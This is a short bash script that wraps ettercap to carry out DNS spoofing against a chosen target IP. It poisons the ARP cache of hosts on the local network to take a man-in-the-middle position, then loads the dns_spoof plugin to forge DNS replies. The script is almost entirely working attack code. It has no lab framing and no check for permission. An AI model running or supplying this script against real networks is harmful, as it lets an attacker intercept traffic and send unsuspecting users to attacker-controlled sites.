#!/bin/bash
# Ettercap - DNS Spoofing
# Options:
# -T : Text-only mode
# -q : Quiet mode
# -i : Interface to use

# Usage: ettercap_dns_spoof.sh <interface> <target_ip>
# Example script
# ettercap_dns_spoof.sh eth0 192.168.1.10

# Check if ettercap is installed
if ! command -v ettercap &> /dev/null
then
    echo "ettercap could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <interface> <target_ip>"
    exit 1
fi

INTERFACE=$1
TARGET_IP=$2

echo "Starting DNS spoofing on interface $INTERFACE targeting $TARGET_IP"

# Perform DNS spoofing
ettercap -T -q -i $INTERFACE -M arp:remote /$TARGET_IP/ /// -P dns_spoof

echo "DNS spoofing completed."
